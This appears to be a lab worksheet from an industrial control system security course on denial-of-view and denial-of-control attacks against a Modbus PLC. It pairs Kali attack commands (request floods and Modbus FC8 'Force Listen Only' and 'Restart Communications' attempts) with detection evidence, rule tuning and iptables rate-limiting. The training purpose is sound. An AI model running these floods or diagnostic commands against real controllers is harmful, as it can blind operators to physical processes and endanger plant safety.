# 06 — Denial of control / denial of view

**Objective:** Overwhelm or confuse the PLC's communications so the operator loses view and control, without writing a single coil.

**ATT&CK for ICS:** T0814 Denial of Service · T0815 Denial of View · T0829 Loss of View · T0816 Device Restart/Shutdown (attempted)

## Attack (Kali)

```bash
python3 ot_attack.py --target 10.N.40.10 flood --seconds 30        # request flood
for i in $(seq 1 8); do python3 ot_attack.py --target 10.N.40.10 flood --seconds 30 & done; wait   # 8 parallel clients
python3 ot_attack.py --target 10.N.40.10 diag 4                    # FC8/4 Force Listen Only
python3 ot_attack.py --target 10.N.40.10 diag 1                    # FC8/1 Restart Communications
```
OpenPLC doesn't implement FC8, so the diag attempts return exceptions — but real devices do, and the *attempt* is what you detect.

## What you should see

| Source | Evidence |
|---|---|
| HMI | "COMMUNICATION LOSS WITH PLC" banner if the flood starves the runtime |
| Suricata | 9000022 (flood threshold), 9000020/9000021 (FC8 subfunctions) |
| Zeek | massive `modbus.log` volume from one source; exceptions in `modbus_detailed.log`; `OTLab::Modbus_Recon_Function` for FC8 |
| Elastic | `otlab-0006` threshold; Defend on the PLC shows CPU spike |
| Wireshark | I/O Graph spike; `modbus.exception_code` |

## Detect — exercise
Tune `otlab-0006`: what's the max normal request rate from the HMI (scenario 00)? Set the threshold to 5× that and justify it in the rule note.

## Respond & harden
Rate-limiting on the PLC host (`iptables -m hashlimit` on 502) as a compensating control. Compare HMI behaviour during a flood with and without it.

## Journal prompts
- Loss of view vs loss of control — which is worse for an operator, and why?
- Does the field I/O keep working during the flood? What does that mean for the physical process?
